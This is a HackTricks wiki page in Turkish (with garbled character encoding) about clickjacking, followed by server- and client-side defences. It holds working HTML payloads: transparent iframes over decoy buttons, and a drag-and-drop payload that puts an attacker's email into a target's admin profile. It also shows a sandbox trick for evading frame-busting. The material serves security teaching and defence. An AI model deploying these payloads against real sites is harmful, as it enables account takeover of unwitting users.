# Clickjacking

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) veya [**telegram grubumuza**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ topluluk araÃ§larÄ±** tarafÄ±ndan desteklenen ve **iÅŸ akÄ±ÅŸlarÄ±nÄ± otomatikleÅŸtirmeyi** kolayca yapÄ±n.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Clickjacking Nedir

Clickjacking saldÄ±rÄ±sÄ±nda, bir **kullanÄ±cÄ±** ya **gÃ¶rÃ¼nmez** ya da farklÄ± bir Ã¶ÄŸe olarak **kamuflaj yapmÄ±ÅŸ** bir web sayfasÄ±ndaki bir **Ã¶ÄŸeyi tÄ±klamaya kandÄ±rÄ±lÄ±r**. Bu manipÃ¼lasyon, kullanÄ±cÄ± iÃ§in istenmeyen sonuÃ§lara yol aÃ§abilir, Ã¶rneÄŸin kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±m indirme, kÃ¶tÃ¼ amaÃ§lÄ± web sayfalarÄ±na yÃ¶nlendirme, kimlik bilgilerinin veya hassas bilgilerin saÄŸlanmasÄ±, para transferleri veya Ã¼rÃ¼nlerin online satÄ±n alÄ±nmasÄ±.

### FormlarÄ± Ã–nceden Doldurma Hilesi

Bazen bir sayfayÄ± yÃ¼klerken GET parametrelerini kullanarak bir formun alanlarÄ±nÄ±n deÄŸerini **doldurmak mÃ¼mkÃ¼n olabilir**. Bir saldÄ±rgan, bir formu keyfi verilerle doldurmak ve kullanÄ±cÄ±nÄ±n dÃ¼ÄŸmeye basmasÄ±nÄ± saÄŸlamak iÃ§in clickjacking yÃ¼kÃ¼nÃ¼ gÃ¶nderebilir.

### Formu SÃ¼rÃ¼kle ve BÄ±rak ile Doldurma

KullanÄ±cÄ±nÄ±n bir formu **doldurmasÄ±nÄ±** istiyorsanÄ±z ancak doÄŸrudan belirli bilgileri yazmasÄ±nÄ± istemiyorsanÄ±z (Ã¶rneÄŸin, bildiÄŸiniz e-posta veya belirli bir ÅŸifre gibi), sadece sizin kontrol ettiÄŸiniz verileri yazacak bir ÅŸeyi **SÃ¼rÃ¼kle ve BÄ±rak** etmesini isteyebilirsiniz, Ã¶rneÄŸin [**bu Ã¶rnekte**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Ã‡ok AdÄ±mlÄ± YÃ¼kleme
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### SÃ¼rÃ¼kle ve BÄ±rak + TÄ±kla yÃ¼kÃ¼
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

EÄŸer bir kullanÄ±cÄ±nÄ±n **XSS saldÄ±rÄ±sÄ±nÄ± tetiklemek iÃ§in bir Ã¶ÄŸeye tÄ±klamasÄ± gereken** bir saldÄ±rÄ± tespit ettiyseniz ve sayfa **clickjacking'e karÅŸÄ± savunmasÄ±z** ise, kullanÄ±cÄ±yÄ± dÃ¼ÄŸmeye/linke tÄ±klamaya kandÄ±rmak iÃ§in bunu kÃ¶tÃ¼ye kullanabilirsiniz.\
Ã–rnek:\
_Bir hesabÄ±n bazÄ± Ã¶zel detaylarÄ±nda **kendine XSS** buldunuz (detaylar **yalnÄ±zca sizin tarafÄ±nÄ±zdan ayarlanabilir ve okunabilir**). Bu detaylarÄ± ayarlamak iÃ§in **form** olan sayfa **Clickjacking**'e karÅŸÄ± **savunmasÄ±z** ve GET parametreleri ile **formu Ã¶nceden doldurabilirsiniz**._\
\_\_Bir saldÄ±rgan, **XSS yÃ¼kÃ¼** ile **formu Ã¶nceden doldurarak** kullanÄ±cÄ±yÄ± **yanÄ±ltarak** bu sayfaya bir **Clickjacking** saldÄ±rÄ±sÄ± hazÄ±rlayabilir ve **kullanÄ±cÄ±yÄ± formu gÃ¶ndermeye ikna edebilir**. BÃ¶ylece, **form gÃ¶nderildiÄŸinde** ve deÄŸerler deÄŸiÅŸtirildiÄŸinde, **kullanÄ±cÄ± XSS'yi yÃ¼rÃ¼tecektir**.

## Clickjacking'i Azaltma Stratejileri

### Ä°stemci TarafÄ± SavunmalarÄ±

Ä°stemci tarafÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lan betikler, Clickjacking'i Ã¶nlemek iÃ§in aksiyonlar gerÃ§ekleÅŸtirebilir:

* Uygulama penceresinin ana veya Ã¼st pencere olmasÄ±nÄ± saÄŸlama.
* TÃ¼m Ã§erÃ§eveleri gÃ¶rÃ¼nÃ¼r hale getirme.
* GÃ¶rÃ¼nmez Ã§erÃ§evelere tÄ±klamayÄ± engelleme.
* KullanÄ±cÄ±larÄ± potansiyel Clickjacking giriÅŸimlerine karÅŸÄ± tespit etme ve uyarÄ±larda bulunma.

Ancak, bu Ã§erÃ§eve-kÄ±rma betikleri atlatÄ±labilir:

* **TarayÄ±cÄ±larÄ±n GÃ¼venlik AyarlarÄ±:** BazÄ± tarayÄ±cÄ±lar, gÃ¼venlik ayarlarÄ±na veya JavaScript desteÄŸinin eksikliÄŸine dayanarak bu betikleri engelleyebilir.
* **HTML5 iframe `sandbox` Ã–zniteliÄŸi:** Bir saldÄ±rgan, `allow-forms` veya `allow-scripts` deÄŸerleri ile `allow-top-navigation` olmadan `sandbox` Ã¶zniteliÄŸini ayarlayarak Ã§erÃ§eve kÄ±rÄ±cÄ± betikleri etkisiz hale getirebilir. Bu, iframe'Ä±n Ã¼st pencere olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamasÄ±nÄ± engeller, Ã¶rn.
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
### Sunucu TarafÄ± SavunmalarÄ±

#### X-Frame-Options

**`X-Frame-Options` HTTP yanÄ±t baÅŸlÄ±ÄŸÄ±**, bir sayfanÄ±n `<frame>` veya `<iframe>` iÃ§inde oluÅŸturulmasÄ±nÄ±n meÅŸruiyeti hakkÄ±nda tarayÄ±cÄ±lara bilgi vererek Clickjacking'i Ã¶nlemeye yardÄ±mcÄ± olur:

- `X-Frame-Options: deny` - HiÃ§bir etki alanÄ± iÃ§eriÄŸi Ã§erÃ§eveliyemez.
- `X-Frame-Options: sameorigin` - YalnÄ±zca mevcut site iÃ§eriÄŸi Ã§erÃ§eveliyebilir.
- `X-Frame-Options: allow-from https://trusted.com` - YalnÄ±zca belirtilen 'uri' sayfayÄ± Ã§erÃ§eveliyebilir.
- SÄ±nÄ±rlamalarÄ± dikkate alÄ±n: TarayÄ±cÄ± bu direktifi desteklemiyorsa Ã§alÄ±ÅŸmayabilir. BazÄ± tarayÄ±cÄ±lar CSP frame-ancestors direktifini tercih eder.

#### Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) frame-ancestors direktifi

CSP'deki **`frame-ancestors` direktifi**, Clickjacking korumasÄ± iÃ§in Ã¶nerilen yÃ¶ntemdir:

- `frame-ancestors 'none'` - `X-Frame-Options: deny` ile benzer.
- `frame-ancestors 'self'` - `X-Frame-Options: sameorigin` ile benzer.
- `frame-ancestors trusted.com` - `X-Frame-Options: allow-from` ile benzer.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki CSP yalnÄ±zca aynÄ± etki alanÄ±ndan Ã§erÃ§evelenmeyi saÄŸlar:

`Content-Security-Policy: frame-ancestors 'self';`

Daha fazla ayrÄ±ntÄ± ve karmaÅŸÄ±k Ã¶rnekler iÃ§in [frame-ancestors CSP belgelerine](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) ve [Mozilla'nÄ±n CSP frame-ancestors belgelerine](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) bakabilirsiniz.

### Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) ile `child-src` ve `frame-src`

**Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP)**, tarayÄ±cÄ±nÄ±n hangi kaynaklarÄ±n iÃ§eriÄŸi yÃ¼klemesine izin vermesi gerektiÄŸini belirterek Clickjacking ve diÄŸer kod enjeksiyon saldÄ±rÄ±larÄ±nÄ± Ã¶nlemede yardÄ±mcÄ± olan bir gÃ¼venlik Ã¶nlemidir.

#### `frame-src` Direktifi

- Ã‡erÃ§eveler iÃ§in geÃ§erli kaynaklarÄ± tanÄ±mlar.
- `default-src` direktifinden daha spesifiktir.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Bu politika, aynÄ± kÃ¶kten gelen Ã§erÃ§evelere (self) ve https://trusted-website.com'a izin verir.

#### `child-src` YÃ¶nergesi

* Web iÅŸÃ§ileri ve Ã§erÃ§eveler iÃ§in geÃ§erli kaynaklarÄ± belirlemek iÃ§in CSP seviye 2'de tanÄ±tÄ±ldÄ±.
* frame-src ve worker-src iÃ§in bir yedek olarak iÅŸlev gÃ¶rÃ¼r.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Bu politika, aynÄ± kÃ¶kten gelen Ã§erÃ§evelere ve iÅŸÃ§ilere (self) ve https://trusted-website.com'a izin verir.

**KullanÄ±m NotlarÄ±:**

* KullanÄ±m DÄ±ÅŸÄ±: child-src, frame-src ve worker-src lehine kademeli olarak kaldÄ±rÄ±lmaktadÄ±r.
* Yedek DavranÄ±ÅŸ: frame-src mevcut deÄŸilse, Ã§erÃ§eveler iÃ§in yedek olarak child-src kullanÄ±lÄ±r. Her ikisi de mevcut deÄŸilse, default-src kullanÄ±lÄ±r.
* KatÄ± Kaynak TanÄ±mÄ±: SÃ¶mÃ¼rÃ¼yÃ¼ Ã¶nlemek iÃ§in direktiflere yalnÄ±zca gÃ¼venilir kaynaklar ekleyin.

#### JavaScript Ã‡erÃ§eve-KÄ±rma Betikleri

Tamamen gÃ¼venilir olmasa da, JavaScript tabanlÄ± Ã§erÃ§eve kÄ±rma betikleri, bir web sayfasÄ±nÄ±n Ã§erÃ§evelenmesini engellemek iÃ§in kullanÄ±labilir. Ã–rnek:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Anti-CSRF TokenlarÄ± Kullanma

* **Token DoÄŸrulama:** Web uygulamalarÄ±nda anti-CSRF tokenlarÄ± kullanarak, durum deÄŸiÅŸtiren isteklerin kullanÄ±cÄ± tarafÄ±ndan kasÄ±tlÄ± olarak yapÄ±ldÄ±ÄŸÄ±ndan emin olun ve Clickjacking sayfasÄ± aracÄ±lÄ±ÄŸÄ±yla yapÄ±lmadÄ±ÄŸÄ±ndan emin olun.

## Referanslar

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **otomatikleÅŸtirilmiÅŸ iÅŸ akÄ±ÅŸlarÄ±** oluÅŸturun ve yÃ¶netin.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olana kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'Ä± takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR'lar gÃ¶ndererek **paylaÅŸÄ±n**.

</details>
